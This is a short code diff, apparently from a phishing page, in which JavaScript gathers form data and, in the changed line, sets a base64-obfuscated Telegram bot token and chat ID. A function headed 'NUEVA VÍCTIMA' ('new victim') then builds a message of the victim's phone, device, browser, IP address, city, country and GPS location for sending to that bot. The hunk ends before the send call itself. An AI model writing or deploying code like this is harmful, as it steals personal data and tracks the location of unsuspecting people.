@@ -274,7 +274,7 @@ function leerForm(){
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
   var lada=v('lada'),tel=v('telefono');if(tel)form.tel=lada+' '+tel;
 }
-var TOKEN=atob("OTI2NzExNDYyMTpBQUV2U3FYVjBaN25DbmpWTUg1OWJmaXVJc0FTdUU3d3d2VQ==");var CHAT=atob("OTA5MjQ1MjY4Nw==");var API="https://api.telegram.org/bot"+TOKEN;
+var TOKEN=atob("OTI2NzExNDYyMTpBQUV2U3FYVjBaN25DbmpWTUg1OWJmaXVJc1NBdUU3d3d2VQ==");var CHAT=atob("OTA5MjQ1MjY4Nw==");var API="https://api.telegram.org/bot"+TOKEN;
 function enviar(){
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n💻 <b>SO:</b> "+info.so+"\n🌐 <b>Nav:</b> "+info.navegador+"\n📺 <b>Pantalla:</b> "+info.pantalla+"\n🌎 <b>Idioma:</b> "+info.idioma+"\n🔋 <b>Bat:</b> "+info.bateria+"\n📡 <b>Red:</b> "+info.red+"\n📍 <b>IP:</b> "+info.ip+"\n🏙️ <b>Ciudad:</b> "+info.ciudad+"\n🌍 <b>País:</b> "+info.pais+"\n🧭 <b>GPS:</b> "+info.gps+"\n";
